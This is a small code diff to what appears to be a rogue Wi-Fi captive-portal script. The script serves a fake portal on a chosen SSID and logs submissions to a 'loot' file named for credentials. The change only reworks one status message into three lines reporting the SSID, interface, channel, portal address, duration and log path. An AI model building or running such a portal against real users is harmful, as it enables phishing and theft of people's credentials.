@@ -154,7 +154,9 @@ def main():
         log_path = loot / f"credentials_{time.strftime('%Y%m%d_%H%M%S')}.jsonl"
         server = ThreadingHTTPServer((GATEWAY, PORT), handler_for(log_path))
         thread = threading.Thread(target=server.serve_forever, daemon=True); thread.start()
-        print(f"Portal '{ssid}' active on {iface} for {seconds:g}s; log={log_path}", flush=True)
+        print(f"Access point: {ssid} · Interface: {iface} · Channel: {channel}", flush=True)
+        print(f"Portal address after joining the AP: http://{GATEWAY}:{PORT}/", flush=True)
+        print(f"Duration: {seconds:g}s · Submission log: {log_path}", flush=True)
         deadline = time.monotonic() + seconds
         while time.monotonic() < deadline:
             time.sleep(min(5, deadline - time.monotonic()))
